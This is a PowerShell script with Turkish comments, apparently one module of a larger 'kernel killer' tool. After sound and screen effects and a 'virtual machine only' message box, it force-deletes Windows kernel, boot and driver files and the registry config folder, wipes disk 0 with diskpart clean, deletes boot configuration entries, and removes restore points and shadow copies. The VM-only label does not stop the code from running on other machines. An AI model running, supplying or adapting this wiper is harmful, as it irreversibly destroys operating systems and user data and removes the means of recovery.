# ============================================================
# EN – KERNEL SİLME (Vİİİİİ + PATLAMA + BSOD + PENCERE SALLAMA)
# ============================================================

. ./modul_config_oku.ps1

if ($script:KERNEL_SIL -eq 0) {
    Write-Host "EN: Kernel silme pasif." -ForegroundColor Yellow
    exit
}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Runtime.InteropServices

# Pencere sallama için Windows API
$MoveWindow = Add-Type -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
'@ -Name "WinAPI" -Namespace "Console" -PassThru

try {
    $hWnd = [Console.WinAPI]::GetConsoleWindow()

    # ============================================================
    # 1. Vİİİİİİ SESİ (Yükselen frekans)
    # ============================================================
    Write-Host "EN: Vİİİİİİİİİİİ!" -ForegroundColor Red -BackgroundColor Black
    for ($i=0; $i -lt 20; $i++) {
        $freq = 500 + ($i * 100)
        [System.Console]::Beep($freq, 100)
        Start-Sleep -Milliseconds 50

        # Pencere sallama
        $x = Get-Random -Min -15 -Max 15
        $y = Get-Random -Min -15 -Max 15
        [Console.WinAPI]::MoveWindow($hWnd, $x, $y, 800, 600, $true)
    }

    # Pencereyi normale döndür
    [Console.WinAPI]::MoveWindow($hWnd, 0, 0, 800, 600, $true)

    # ============================================================
    # 2. PATLAMA EFEKTİ (Beyaz ekran + glitch)
    # ============================================================
    $form = New-Object System.Windows.Forms.Form
    $form.WindowState = 'Maximized'
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.BackColor = 'White'
    $form.Show()

    Start-Sleep -Milliseconds 300
    $form.BackColor = 'Black'
    Start-Sleep -Milliseconds 200
    $form.BackColor = 'Red'
    Start-Sleep -Milliseconds 200
    $form.BackColor = 'White'
    Start-Sleep -Milliseconds 200
    $form.Close()

    # ============================================================
    # 3. BSOD UYARISI (Gerçek BSOD tetikleme)
    # ============================================================
    [System.Windows.Forms.MessageBox]::Show(
        "KERNEL SİLİNİYOR!" +
        "`n`nBu işlem VM'yi tamamen yok eder." +
        "`nSADECE SANAL MAKİNE İÇİN!",
        "EN - ULTİMATE KERNEL KILLER",
        "OK",
        "Error"
    )

    # ============================================================
    # 4. KERNEL DOSYALARINI SİL
    # ============================================================
    $kernelFiles = @(
        "C:\Windows\System32\ntoskrnl.exe",
        "C:\Windows\System32\ntkrnlpa.exe",
        "C:\Windows\System32\hal.dll",
        "C:\Windows\System32\winload.exe",
        "C:\Windows\System32\winload.efi",
        "C:\Windows\System32\winresume.exe",
        "C:\Windows\System32\winresume.efi",
        "C:\Windows\System32\kdcom.dll",
        "C:\Windows\System32\pshed.dll",
        "C:\Windows\System32\bootvid.dll"
    )

    foreach ($file in $kernelFiles) {
        if (Test-Path $file) {
            Remove-Item -Path $file -Force -ErrorAction SilentlyContinue
            Write-Host "Silindi: $file" -ForegroundColor Red
        }
    }

    # ============================================================
    # 5. KRİTİK SİSTEM DOSYALARI
    # ============================================================
    $systemFiles = @(
        "C:\Windows\System32\ntdll.dll",
        "C:\Windows\System32\kernel32.dll",
        "C:\Windows\System32\win32k.sys",
        "C:\Windows\System32\drivers\*",
        "C:\Windows\System32\config\*"
    )

    foreach ($file in $systemFiles) {
        if (Test-Path $file) {
            Remove-Item -Path $file -Force -Recurse -ErrorAction SilentlyContinue
            Write-Host "Silindi: $file" -ForegroundColor Red
        }
    }

    # ============================================================
    # 6. MBR TEMİZLEME
    # ============================================================
    try {
        $diskpartKomut = @"
select disk 0
clean
convert mbr
exit
"@
        $diskpartKomut | Out-File -FilePath "diskpart.txt"
        Start-Process -NoNewWindow -FilePath "diskpart" -ArgumentList "/s diskpart.txt" -Wait
        Remove-Item "diskpart.txt" -Force -ErrorAction SilentlyContinue
        Write-Host "Disk MBR temizlendi." -ForegroundColor Red
    } catch {}

    # ============================================================
    # 7. BCD SİL
    # ============================================================
    try {
        Start-Process -NoNewWindow -FilePath "bcdedit" -ArgumentList "/delete {default} /f"
        Start-Process -NoNewWindow -FilePath "bcdedit" -ArgumentList "/delete {bootmgr} /f"
        Start-Process -NoNewWindow -FilePath "bcdedit" -ArgumentList "/delete {current} /f"
        Write-Host "BCD silindi." -ForegroundColor Red
    } catch {}

    # ============================================================
    # 8. GERİ YÜKLEME NOKTALARINI TEMİZLE
    # ============================================================
    try {
        Disable-ComputerRestore -Drive "C:\" -ErrorAction SilentlyContinue
        vssadmin delete shadows /all /quiet
        Write-Host "Geri yükleme noktaları temizlendi." -ForegroundColor Red
    } catch {}

    # ============================================================
    # 9. BİTİŞ MESAJI
    # ============================================================
    Write-Host "VM TAMAMEN YOK EDİLDİ!" -ForegroundColor Red -BackgroundColor Black
    Write-Host "Vİİİİİİİİİ... PATLADI!" -ForegroundColor Red

    $log = "C:\EN_Log.txt"
    Add-Content -Path $log -Value "[$(Get-Date)] ULTİMATE KERNEL SİLME TAMAMLANDI (Vİİİİİ + PATLAMA + PENCERE SALLAMA)."

} catch {
    Write-Host "Kernel silme hatasi: $_" -ForegroundColor Red
}